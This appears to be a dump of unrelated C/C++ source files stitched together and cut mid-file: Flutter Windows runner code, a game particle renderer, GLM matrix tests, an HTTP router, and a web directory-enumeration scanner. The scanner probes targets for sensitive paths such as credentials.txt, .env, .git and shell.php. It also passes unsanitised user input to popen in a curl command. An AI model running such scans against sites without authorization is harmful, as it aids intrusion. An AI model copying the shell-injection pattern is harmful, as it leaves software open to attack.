Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "/*\n * Copyright (c) 2010-2022 OTClient <https://github.com/edubart/otclient>\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n */\n\n#include \"particle.h\"\n#include \"drawpoolmanager.h\"\n\nvoid Particle::render() const\n{\n    if (!m_texture) {\n        g_drawPool.addFilledRect(m_rect, m_color);\n        return;\n    }\n\n    g_drawPool.setCompositionMode(m_compositionMode, true);\n    g_drawPool.addTexturedRect(m_rect, m_texture, m_color);\n}\n\nvoid Particle::update(float elapsedTime)\n{\n    // check if finished\n    if (m_duration >= 0 && m_elapsedTime >= m_duration) {\n        m_finished = true;\n        return;\n    }\n\n    updateColor();\n    updateSize();\n    updatePosition(elapsedTime);\n\n    m_elapsedTime += elapsedTime;\n}\n\nvoid Particle::updatePosition(float elapsedTime)\n{\n    if (m_ignorePhysicsAfter < 0 || m_elapsedTime < m_ignorePhysicsAfter) {\n        // update position\n        PointF delta = m_velocity * elapsedTime;\n        delta.y *= -1; // painter orientate Y axis in the inverse direction\n\n        const auto& position = m_position + delta;\n\n        if (m_position != position) {\n            m_position += delta;\n        }\n\n        // update acceleration\n        m_velocity += m_acceleration * elapsedTime;\n    }\n\n    m_rect.move(static_cast<int>(m_position.x) - m_size.width() / 2, static_cast<int>(m_position.y) - m_size.height() / 2);\n}\n\nvoid Particle::updateSize()\n{\n    m_size = m_startSize + (m_finalSize - m_startSize) / m_duration * m_elapsedTime;\n    m_rect.resize(m_size);\n}\n\nvoid Particle::updateColor()\n{\n    const float currentLife = m_elapsedTime / m_duration;\n    if (currentLife < m_colorsStops[1]) {\n        const float range = m_colorsStops[1] - m_colorsStops[0];\n        const float factor = (currentLife - m_colorsStops[0]) / range;\n        m_color = m_colors[0] * (1.0f - factor) + m_colors[1] * factor;\n    } else if (m_colors.size() > 1) {\n        m_colors.erase(m_colors.begin());\n        m_colorsStops.erase(m_colorsStops.begin());\n    } else if (m_color != m_colors[0]) {\n        m_color = m_colors[0];\n    }\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"fic4_shared_preferences\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <glm/ext/matrix_relational.hpp>\n#include <glm/ext/matrix_double2x2.hpp>\n#include <glm/ext/matrix_double2x3.hpp>\n#include <glm/ext/matrix_double2x4.hpp>\n#include <glm/ext/matrix_double3x2.hpp>\n#include <glm/ext/matrix_double3x3.hpp>\n#include <glm/ext/matrix_double3x4.hpp>\n#include <glm/ext/matrix_double4x2.hpp>\n#include <glm/ext/matrix_double4x3.hpp>\n#include <glm/ext/matrix_double4x4.hpp>\n#include <glm/ext/vector_double2.hpp>\n#include <glm/ext/vector_double3.hpp>\n#include <glm/ext/vector_double4.hpp>\n#include <glm/ext/matrix_float2x2.hpp>\n#include <glm/ext/matrix_float2x3.hpp>\n#include <glm/ext/matrix_float2x4.hpp>\n#include <glm/ext/matrix_float3x2.hpp>\n#include <glm/ext/matrix_float3x3.hpp>\n#include <glm/ext/matrix_float3x4.hpp>\n#include <glm/ext/matrix_float4x2.hpp>\n#include <glm/ext/matrix_float4x3.hpp>\n#include <glm/ext/matrix_float4x4.hpp>\n#include <glm/ext/vector_float2.hpp>\n#include <glm/ext/vector_float3.hpp>\n#include <glm/ext/vector_float4.hpp>\n#include <glm/ext/scalar_ulp.hpp>\n\ntemplate <typename matType, typename vecType>\nstatic int test_equal()\n{\n\ttypedef typename matType::value_type valType;\n\n\tvalType const Epsilon = static_cast<valType>(0.001f);\n\tvalType const One = static_cast<valType>(1);\n\tvalType const Two = static_cast<valType>(2);\n\n\tint Error = 0;\n\n\tError += glm::all(glm::equal(matType(One), matType(One), Epsilon)) ? 0 : 1;\n\tError += glm::all(glm::equal(matType(One), matType(Two), vecType(Epsilon))) ? 1 : 0;\n\n\treturn Error;\n}\n\ntemplate <typename matType, typename vecType>\nstatic int test_notEqual()\n{\n\ttypedef typename matType::value_type valType;\n\n\tvalType const Epsilon = static_cast<valType>(0.001f);\n\tvalType const One = static_cast<valType>(1);\n\tvalType const Two = static_cast<valType>(2);\n\n\tint Error = 0;\n\n\tError += !glm::any(glm::notEqual(matType(One), matType(One), Epsilon)) ? 0 : 1;\n\tError += !glm::any(glm::notEqual(matType(One), matType(Two), vecType(Epsilon))) ? 1 : 0;\n\n\treturn Error;\n}\n\n\ntemplate <typename T>\nstatic int test_equal_ulps()\n{\n\ttypedef glm::mat<4, 4, T, glm::defaultp> mat4;\n\n\tT const One(1);\n\tmat4 const Ones(1);\n\n\tint Error = 0;\n\n\tT const ULP1Plus = glm::nextFloat(One);\n\tError += glm::all(glm::equal(Ones, mat4(ULP1Plus), 1)) ? 0 : 1;\n\n\tT const ULP2Plus = glm::nextFloat(ULP1Plus);\n\tError += !glm::all(glm::equal(Ones, mat4(ULP2Plus), 1)) ? 0 : 1;\n\n\tT const ULP1Minus = glm::prevFloat(One);\n\tError += glm::all(glm::equal(Ones, mat4(ULP1Minus), 1)) ? 0 : 1;\n\n\tT const ULP2Minus = glm::prevFloat(ULP1Minus);\n\tError += !glm::all(glm::equal(Ones, mat4(ULP2Minus), 1)) ? 0 : 1;\n\n\treturn Error;\n}\n\ntemplate <typename T>\nstatic int test_notEqual_ulps()\n{\n\ttypedef glm::mat<4, 4, T, glm::defaultp> mat4;\n\n\tT const One(1);\n\tmat4 const Ones(1);\n\n\tint Error = 0;\n\n\tT const ULP1Plus = glm::nextFloat(One);\n\tError += !glm::all(glm::notEqual(Ones, mat4(ULP1Plus), 1)) ? 0 : 1;\n\n\tT const ULP2Plus = glm::nextFloat(ULP1Plus);\n\tError += glm::all(glm::notEqual(Ones, mat4(ULP2Plus), 1)) ? 0 : 1;\n\n\tT const ULP1Minus = glm::prevFloat(One);\n\tError += !glm::all(glm::notEqual(Ones, mat4(ULP1Minus), 1)) ? 0 : 1;\n\n\tT const ULP2Minus = glm::prevFloat(ULP1Minus);\n\tError += glm::all(glm::notEqual(Ones, mat4(ULP2Minus), 1)) ? 0 : 1;\n\n\treturn Error;\n}\n\nint main()\n{\n\tint Error = 0;\n\n\tError += test_equal_ulps<float>();\n\tError += test_equal_ulps<double>();\n\tError += test_notEqual_ulps<float>();\n\tError += test_notEqual_ulps<double>();\n\n\tError += test_equal<glm::mat2x2, glm::vec2>();\n\tError += test_equal<glm::mat2x3, glm::vec2>();\n\tError += test_equal<glm::mat2x4, glm::vec2>();\n\tError += test_equal<glm::mat3x2, glm::vec3>();\n\tError += test_equal<glm::mat3x3, glm::vec3>();\n\tError += test_equal<glm::mat3x4, glm::vec3>();\n\tError += test_equal<glm::mat4x2, glm::vec4>();\n\tError += test_equal<glm::mat4x3, glm::vec4>();\n\tError += test_equal<glm::mat4x4, glm::vec4>();\n\n\tError += test_equal<glm::dmat2x2, glm::dvec2>();\n\tError += test_equal<glm::dmat2x3, glm::dvec2>();\n\tError += test_equal<glm::dmat2x4, glm::dvec2>();\n\tError += test_equal<glm::dmat3x2, glm::dvec3>();\n\tError += test_equal<glm::dmat3x3, glm::dvec3>();\n\tError += test_equal<glm::dmat3x4, glm::dvec3>();\n\tError += test_equal<glm::dmat4x2, glm::dvec4>();\n\tError += test_equal<glm::dmat4x3, glm::dvec4>();\n\tError += test_equal<glm::dmat4x4, glm::dvec4>();\n\n\tError += test_notEqual<glm::mat2x2, glm::vec2>();\n\tError += test_notEqual<glm::mat2x3, glm::vec2>();\n\tError += test_notEqual<glm::mat2x4, glm::vec2>();\n\tError += test_notEqual<glm::mat3x2, glm::vec3>();\n\tError += test_notEqual<glm::mat3x3, glm::vec3>();\n\tError += test_notEqual<glm::mat3x4, glm::vec3>();\n\tError += test_notEqual<glm::mat4x2, glm::vec4>();\n\tError += test_notEqual<glm::mat4x3, glm::vec4>();\n\tError += test_notEqual<glm::mat4x4, glm::vec4>();\n\n\tError += test_notEqual<glm::dmat2x2, glm::dvec2>();\n\tError += test_notEqual<glm::dmat2x3, glm::dvec2>();\n\tError += test_notEqual<glm::dmat2x4, glm::dvec2>();\n\tError += test_notEqual<glm::dmat3x2, glm::dvec3>();\n\tError += test_notEqual<glm::dmat3x3, glm::dve",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <cstdlib> // For system() function\n#include <fstream> // For file output\n#include <thread> // For parallel requests\n#include <mutex> // For thread safety\n#include <unordered_set> // For storing unique URLs\n\n// Global mutex for thread-safe output\nstd::mutex mtx;\n\n// Function to perform directory and file enumeration (enhanced version)\nvoid performEnumeration(const std::string& baseUrl, const std::vector<std::string>& dirFileNames, std::ofstream& outputFile, std::unordered_set<std::string>& foundUrls) {\n    for (const auto& name : dirFileNames) {\n        std::string url = baseUrl + \"/\" + name;\n        std::string curlCommand = \"curl -s -L -o /dev/null -w '%{http_code}' \" + url;\n        std::string curlOutput = \"\";\n        FILE* curlStream = popen(curlCommand.c_str(), \"r\");\n        if (curlStream) {\n            char buffer[128];\n            while (!feof(curlStream)) {\n                if (fgets(buffer, sizeof(buffer), curlStream) != NULL) {\n                    curlOutput += buffer;\n                }\n            }\n            pclose(curlStream);\n\n            // Check if the HTTP status code is 200 OK or 302 Found\n            if (curlOutput.find(\"200\") != std::string::npos || curlOutput.find(\"302\") != std::string::npos) {\n                mtx.lock(); // Lock mutex for thread-safe access to foundUrls\n                if (foundUrls.find(url) == foundUrls.end()) { // Check if URL is not already found\n                    outputFile << url << \" - Found\" << std::endl;\n                    foundUrls.insert(url); // Add URL to foundUrls set\n                }\n                mtx.unlock(); // Unlock mutex\n            }\n        }\n    }\n}\n\nint main() {\n    std::string websiteUrl;\n    std::vector<std::string> dirFileNames = {\n        \"admin\", \"backup\", \"login\", \"test\", \"wp-admin\", \"robots.txt\", \"sitemap.xml\", \"README.md\",\n        \"images\", \"uploads\", \"css\", \"js\", \"fonts\", \"cgi-bin\" , \"bin\" , \"conf\" , \"data\" , \"db\" , \n        \"docs\" , \"downloads\" , \"include\" , \"js\" , \"lib\" , \"logs\" , \"media\" , \"modules\" , \n        \"mode-modules\" , \"phpmyadmin\" , \"script\" , \"src\" , \"temp\" , \"test\" , \"var\" , \"www\" , \n        \".htaccess\" , \"LICENSE.txt\" , \"web.config\" , \"config.php\" , \"index.php\" , \"login.php\" , \n        \"admin.php\" , \"backup.sql\" , \"database.sql\" , \"report.pdf\" , \"credentials.txt\" , \"config.json\", \n        \"app.js\" , \"package.json\" , \"webpack.config.js\", \"Dockerfile\" , \"wp-login.php\" , \"phpinfo.php\" , \n        \"mysqladmin\" , \"dev\" , \"debug\" , \"backup\" , \"shell\" , \"logs\" , \"setup\" , \"phpMyAdmin\" , \n        \".env\" , \".git\" , \".svn\" , \"config\" , \"confidential\" , \"dump\" , \"email\" , \"error\" , \"files\" , \n        \"ild_files\" , \"public\" , \"reports\" , \"temp\" , \"tmp\" , \"upload\" , \"web\" , \"admin.txt\" , \n        \"backup.zip\" , \"config.ini\" , \"credentials.json\" , \"db.sql\" , \"error_log\" , \"index.html\" , \n        \"info.php\" , \"login.html\" , \"passwords.txt\" , \"report.doc\" , \"setup.exe\" , \"shell.php\" , \n        \"test.php\" , \"usernames.txt\" , \"error\" , \"include\" , \"register\" , \"report\" , \"backup_files\" , \n        \"config_backup\" , \"development\" , \"devops\" , \"documents\" , \"important\" , \"invoices\" , \n        \"libraries\" , \"media\" , \"private\" , \"public_html\" , \"scripts\" , \"secure\" , \"sessions\" , \n        \"static\" , \"system\" , \"templates\" , \"tools\" , \"admin_panel.php\" , \"backup_db.sql\" , \n        \"config_backup.tar.gz\" , \"credentials_backup.txt\" , \"database_backup.sql\" , \"error_logs.log\" ,\n        \"index.htm\" , \"password_list.txt\" , \"reports_backup.zip\" , \"setup.sh\" , \"shell_script.sh\" ,\n        \"test_page.php\" , \"users_backup.csv\" , \".config\" , \".well-known\" , \"lib\" , \"public_html\" , \n        \"scripts\" , \"secure\", \"sessions\" , \"webroot\" , \".idea\" , \".vscode\" , \"admin_panel\" , \n        \"webapps\" , \"vti_bin/_vti_adm/admin.dll\" , \"vti_bin/_vti_adm/author.dll\" , \n        \"vti_bin/shtml.dll\" , \"vti_cnf\" , \"vti_inf\" , \"vti_log\" , \"vti_map\" , \"vti_pvt\" , \n        \"vti_rpc\" , \"vti_script\" , \"vti_txt\" , \"wp-app\" , \"wp-atom\" , \"wpau-backup\" , \"wp-blog-header\" , \n        \"wpcallback\" , \"wp-comments\" , \"wp-commentsrss2\" , \"wp-config\" , \"wpcontent\" , \"wp-content\" , \n        \"wp-cron\" , \"wp-dbmanager\" , \"wp-feed\" , \"wp-includes\" , \"wp-images\" , \"wp-mail\" , \"wp-pass\" , \n        \"wp-rdf\" , \"wp-register\" , \"wp-rss\" , \"wp-rss2\" , \"wps\" , \"wp-settings\" , \"wp-signup\" , \n        \"wp-syntax\" , \"wp-trackback\" , \"wrap\" , \"ws\" , \"ws_ftp\" , \"WS_FTP\" , \"WS_FTP.LOG\" , \n        \"ws-client\" , \"wsdl\" , \"wstat\" , \"wstats\" , \"wwwlog\" , \"wwwuser\" , \"xajax\" , \"xajax_js\" , \n        \"xcache\" , \"xcart\" , \"xhtml\" , \"xmfiles\" , \"xmlimporter\" , \"xmlrpc\" , \"xml-rpc\" , \n        \"xmlrpc.php\" , \"xmlrpc_server\" , \"xmlrpc_server.php\" , \"xmlrpc_server.php\"\n\n\n        // Add more common directory and file names as needed\n    };\n    std::unordered_set<std::string> foundUrls; // Set to store unique URLs\n\n    std::cout << \"Enter the target website URL to perform directory and file enumeration: \";\n    std::getline(std::cin, websiteUrl);\n\n   ",
    "#include \"stdafx.h\"\n#include \"Router.h\"\n#include \"api/Aspect.h\"\n#include \"domain/vo/JsonVO.h\"\n\n#ifdef HTTP_SERVER_DEMO\n#include \"sample/SampleController.h\"\n#include \"user/DepartController.h\"\n#include \"uselib/ws/TestWs.h\"\n#endif\n\n\nRouter::Router(http_server* sever)\n{\n\tthis->server = sever;\n}\n\nvoid Router::initRouter()\n{\n\t//\u8bbe\u7f6e\u9759\u6001\u6587\u4ef6\u76ee\u5f55\n\tserver->set_public_root_directory(\"public\");\n\tserver->set_static_dir(\"static/file\");\n\n#ifdef HTTP_SERVER_DEMO\n\t//\u7ed1\u5b9a\u9996\u9875\u9875\u9762\n\tBIND_GET_ROUTER(server, \"/\", [](request& req, response& res) {\n\t\tres.render_raw_view(\"./public/test.html\");\n\t\t}, nullptr);\n#endif\n\n\t//\u521d\u59cb\u5316\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u5904\u7406\u63a5\u53e3\n\tBIND_POST_ROUTER(server, \"/upload-file\", [](request& req, response& res)\n\t\t{\n\t\t\tif (req.get_content_type() != content_type::multipart)\n\t\t\t{\n\t\t\t\tJsonVO vo = JsonVO(\"\", RS_CONTENT_TYPE_ERR);\n\t\t\t\tnlohmann::json jvo = nlohmann::json(vo);\n\t\t\t\tjvo.erase(\"data\");\n\t\t\t\tres.render_json(jvo);\n\t\t\t\treturn;\n\t\t\t}\n\t\t\t//\u83b7\u53d6\u6587\u4ef6\u8def\u5f84\n\t\t\tauto& files = req.get_upload_files();\n\t\t\tvector<string> filePaths;\n\t\t\tfor (auto& file : files) {\n\t\t\t\tfilePaths.push_back(file.get_file_path().substr(1));\n\t\t\t\tstd::cout << file.get_file_path() << \" \" << file.get_file_size() << std::endl;\n\t\t\t}\n\t\t\tres.render_json(nlohmann::json(JsonVO<vector<string>>(filePaths, RS_SUCCESS)));\n\t\t}, nullptr);\n\t\n#ifdef HTTP_SERVER_DEMO\n\tcreateSampleRouter();\n\tcreateUserDepartRouter();\n\tTestWs::addChatHandler(server);\n#endif\n\n\t//#TIP :\u7cfb\u7edf\u6269\u5c55\u8def\u7531\u5b9a\u4e49\uff0c\u5199\u5728\u8fd9\u4e2a\u540e\u9762\n\n}\n\n#ifdef HTTP_SERVER_DEMO\nvoid Router::createSampleRouter()\n{\n\tBIND_GET_ROUTER(server, \"/get\", &SampleController::querySample, nullptr);\n\tBIND_POST_ROUTER(server, \"/post\", &SampleController::addSample, nullptr);\n\tBIND_PUT_ROUTER(server, \"/put\", &SampleController::modifySample, nullptr);\n\tBIND_DEL_ROUTER(server, \"/delete\", &SampleController::removeSample, nullptr);\n\tBIND_DEL_ROUTER(server, \"/delete-by-id\", &SampleController::removeById, nullptr);\n\tBIND_POST_ROUTER(server, \"/json\", &SampleController::jsonSample, nullptr);\n}\n\nvoid Router::createUserDepartRouter()\n{\n\tBIND_POST_ROUTER(server, \"/depart-add\", &DepartController::addDepart, nullptr);\n\tBIND_POST_ROUTER(server, \"/depart-add-more\", &DepartController::addDepartMore, nullptr);\n}\n#endif\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = 